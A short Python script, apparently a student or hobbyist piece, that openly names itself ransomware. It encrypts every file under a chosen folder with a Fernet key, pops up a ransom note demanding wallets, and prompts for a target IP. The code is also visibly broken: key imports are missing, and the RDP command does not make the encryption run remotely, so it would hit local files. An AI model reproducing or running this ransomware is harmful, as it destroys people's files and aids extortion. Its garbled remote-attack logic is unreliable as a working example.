# Sierra Maldonado
#!/usr/bin/env python3
import os
import subprocess

# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()


class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt all files in a folder on a different VM using SSH
    def encrypt_folder_on_vm(self, target_vm_ip, folder_path):
        # Establish RDP connection
        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
        subprocess.run(rdp_command, shell=True)

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                encrypted = fernet.encrypt(data)

                with open(file_path, 'wb') as f:
                    f.write(encrypted)

    # Decrypt files using the Fernet symmetric key
    def decrypt_folder_on_vm(self, target_vm_ip, folder_path):
        # Establish RDP connection
        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
        subprocess.run(rdp_command, shell=True)

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                decrypted = fernet.decrypt(data)

                with open(file_path, 'wb') as f:
                    f.write(decrypted)

    # Display Ransom Note as Popup on Windows using RDP
    def ransom_note(self):
        # Establish RDP connection
        rdp_command = "rdesktop -u your_username -p your_password target_vm_ip"
        subprocess.run(rdp_command, shell=True)

        ransom_note_text = "You have been bamboozled by the Black Fox Bandits. Please hand over your wallets."
        subprocess.run(f"msg * {ransom_note_text}", shell=True)

    def attack_windows_server(self):
        target_ip = input("Enter the target IP address: ")
        
        # Create menu items
        encrypt_item = MenuItem("Encrypt", lambda: self.encrypt_folder_on_vm(target_ip, input("Enter the folder path to encrypt: ")))
        popup_item = MenuItem("Pop-up", self.ransom_note)
        decrypt_item = MenuItem("Decrypt", lambda: self.decrypt_folder_on_vm(target_ip, input("Enter the folder path to decrypt: ")))
        exit_item = MenuItem("Exit", exit)

        # Create menu
        menu = Menu([encrypt_item, popup_item, decrypt_item, exit_item])
        menu.show()

ransomware = Ransomware()
ransomware.attack_windows_server()
